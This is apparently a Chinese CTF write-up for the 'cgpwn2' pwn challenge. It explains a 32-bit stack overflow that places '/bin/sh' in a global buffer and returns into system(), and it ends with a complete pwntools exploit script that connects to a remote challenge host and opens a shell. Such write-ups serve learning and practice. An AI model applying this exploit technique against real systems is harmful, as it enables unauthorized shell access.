---
layout: post
title: 'PWN手的成长之路-20-cgpwn2'
date: "2025-10-20T00:44:06Z"
---
PWN手的成长之路-20-cgpwn2
===================

![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019200245995-1535055211.png)

file，checksec:  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019200417445-1225733321.png)

main 函数：  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019203736562-1688715362.png)

hello 函数：  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019203805163-136725188.png)  
name 中可以保存字符串，因此我们在 name 中输入 /bin/sh，那么我们就可以利用变量 name 的内存地址，得到 system('/bin/sh')，从而得到shell。

pwn 函数（存在system）：  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019203831722-572412605.png)

溢出大小为：0x26+4  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019204158927-1902179163.png)

我本来在ROPgadget中找到了 sh 字符串，但是一直无法成功得到shell，之后查看才得知，这个sh并不是单纯的 sh。草率了。但是不知道为什么 ciscn\_2019\_ne\_5 可以跑通。求师傅指教。  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019202950814-1805270485.png)  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019203053497-74047426.png)  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251019203124691-119137441.png)

payload加入main函数，原因：32位和64位的结构不同，32位调用一个函数需要返回地址，之后再调用其他的进行传参，而且32位是用栈传递参数的，而64为使用比如rdi，rsi等寄存器进行传参，因此需要插入一个 main 函数作为返回地址。

利用exp：

    from pwn import *
    
    #start 
    r = remote('61.147.171.35',63069)
    context.log_level = 'debug'
    elf = ELF('./pwn')
    
    #params
    #system_addr = 0x8048420
    system_addr = elf.sym['system']
    main_addr = elf.sym['main']
    name_addr = elf.sym['name']
    
    #attack
    payload = b'a'*(0x26+4) + p32(system_addr) + p32(main_addr) + p32(name_addr)
    r.sendlineafter(b'name',b'/bin/sh')
    r.sendline(payload)
    r.interactive()